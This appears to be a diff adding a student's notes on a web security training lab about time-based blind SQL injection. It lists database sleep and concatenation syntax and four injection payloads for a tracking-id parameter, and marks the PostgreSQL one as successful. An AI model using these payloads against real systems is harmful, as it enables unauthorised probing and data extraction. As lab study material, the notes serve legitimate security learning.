@@ -1,0 +1,23 @@
+Lab 13 - Blind SQL injection with time delays
+
+vulnerable parameter: tracking id
+
+End goals: 
+1. To prove that the field is vulnerable to blind SQLi(time based)
+
+Analysis:
+Unconditional time delays for 10 seconds in various database:
+Oracle: dbms_pipe.receive_message(('a'), 10)
+Microsoft: WAITFOR DELAY '0:0:10'
+PostgreSQL: SELECT pg_sleep(10)
+MySQL: SELECT SLEEP(10)
+
+Concatnate in various database:
+Oracle, PostgreSQL: 'foo' || 'bar'
+Microsoft: 'foo' + 'bar'
+MySQL 'foo' 'bar' (using space) or CANCAT('foo', 'bar')
+
+'  (SELECT SLEEP(10))-- > MySQL
+' + (WAITFOR DELAY '0:0:10')-- > Microsoft
+' || (SELECT pg_sleep(10))-- > PostgreSQL > success
+' || (dbms_pipe.receive_message(('a'), 10))-- > Oracle
